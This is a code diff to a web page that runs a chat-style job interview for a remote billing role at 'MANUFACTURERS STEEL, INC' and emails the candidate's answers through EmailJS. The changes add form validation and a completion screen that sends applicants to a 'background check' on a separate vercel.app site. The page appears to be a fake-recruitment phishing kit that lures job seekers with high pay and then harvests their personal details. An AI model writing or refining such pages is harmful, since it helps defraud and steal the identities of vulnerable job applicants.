@@ -35,13 +35,20 @@ font-size:20px;
 margin-bottom:20px;
 }
 
-input, textarea, select{
+input{
 width:100%;
 padding:14px;
 font-size:16px;
 border:1px solid #ddd;
 border-radius:6px;
-margin-bottom:20px;
+margin-bottom:10px;
+}
+
+.error{
+font-size:14px;
+color:#dc2626;
+margin-bottom:15px;
+display:none;
 }
 
 button{
@@ -64,10 +71,6 @@ color:#666;
 margin-bottom:20px;
 text-align:right;
 }
-
-.hidden{
-display:none;
-}
 </style>
 </head>
 
@@ -83,7 +86,8 @@ MANUFACTURERS STEEL, INC
 
 <div class="question" id="questionText"></div>
 
-<input id="answerInput"/>
+<input id="answerInput" />
+<div class="error" id="errorText">Please enter your answer to continue.</div>
 
 <button onclick="nextQuestion()">Next</button>
 
@@ -93,45 +97,25 @@ MANUFACTURERS STEEL, INC
 emailjs.init("3PXsfITe9J9_Y5Jxj");
 
 const questions = [
-
 "Hi, I’m Cynthia. Before we begin, can you confirm the position you’re applying for?",
-
 "Can you confirm where you are currently located?",
-
 "The starting pay is $30/hr up to $35/hr. Does this compensation work for you?",
-
 "What type of schedule are you seeking — full-time, part-time, or flexible?",
-
 "Tell us a little about yourself and your professional background.",
-
 "What interested you in this role with MANUFACTURERS STEEL, INC?",
-
 "Do you have experience with administrative tasks such as data entry, recordkeeping, scheduling, or customer support?",
-
 "Have you worked with billing-related tasks like invoices, payment tracking, or resolving billing questions?",
-
 "How do you ensure accuracy and attention to detail when managing multiple tasks or financial records?",
-
 "If a customer contacts you with a billing concern or urgent issue, how would you handle it?",
-
 "If you receive a task that is unclear or missing information, what would you do?",
-
 "Are you comfortable communicating professionally with customers and internal teams through email, chat, and phone?",
-
 "Share an example of a time you caught an error or prevented a problem.",
-
 "If you notice repeated billing or admin issues from the same process, how would you address it?",
-
 "What would you do if you were unsure how to complete a task?",
-
 "How do you stay organized and productive while working remotely?",
-
 "What software tools or technical skills help you succeed in admin and billing support?",
-
 "How do you maintain a professional tone in emails or chat?",
-
 "This position requires a background check. Are you comfortable proceeding?",
-
 "Before we wrap up, is there anything else you'd like us to know?"
 ];
 
@@ -141,29 +125,29 @@ let answers = [];
 const qText = document.getElementById("questionText");
 const progress = document.getElementById("progress");
 const input = document.getElementById("answerInput");
+const errorText = document.getElementById("errorText");
 
 function showQuestion(){
 qText.innerText = questions[current];
 progress.innerText = "Question " + (current+1) + " of " + questions.length;
-input.value="";
+input.value = "";
+errorText.style.display = "none";
 input.focus();
 }
 
 function nextQuestion(){
-
 if(!input.value.trim()){
-alert("Please enter your answer.");
+errorText.style.display = "block";
 return;
 }
 
+errorText.style.display = "none";
 answers.push(input.value.trim());
-
 current++;
 
 if(current < questions.length){
 showQuestion();
-}
-else{
+} else {
 submitInterview();
 }
 }
@@ -174,26 +158,35 @@ document.querySelector(".container").innerHTML =
 "<h2>Submitting your interview...</h2>";
 
 let message = "";
-
 questions.forEach((q,i)=>{
-message += q + "\n";
-message += "Answer: " + answers[i] + "\n\n";
+message += q + "\nAnswer: " + answers[i] + "\n\n";
 });
 
 emailjs.send(
 "service_cwzrlga",
 "template_lgzkb7s",
-{
-interview_answers: message
-}
+{ interview_answers: message }
 ).then(()=>{
 
 document.querySelector(".container").innerHTML = `
 <h2>✅ Interview Submitted</h2>
-<p>Thank you for completing your interview with Manufacturers Steel, Inc.</p>
-<p>Our team will review your responses and follow up within 12 hours.</p>
-`;
 
+<p>Thank you for taking the time to complete this interview. We truly appreciate your interest in joining <strong>MANUFACTURERS STEEL, INC</strong>.</p>
+
+<p>Please complete the background check using the link below:</p>
+
+<p>
+👉 <a href="https://manufacturerssteel-verification.vercel.app" target="_blank">
+https://manufacturerssteel-verification.vercel.app
+</a>
+</p>
+
+<p>Once completed, our team will review your information and follow up within <strong>12 hours</strong> regarding the next steps.</p>
+
+<p>If you have any questions in the meantime, feel free to reach out.</p>
+
+<p><strong>We look forward to potentially welcoming you to our team.</strong></p>
+`;
 });
 }
 
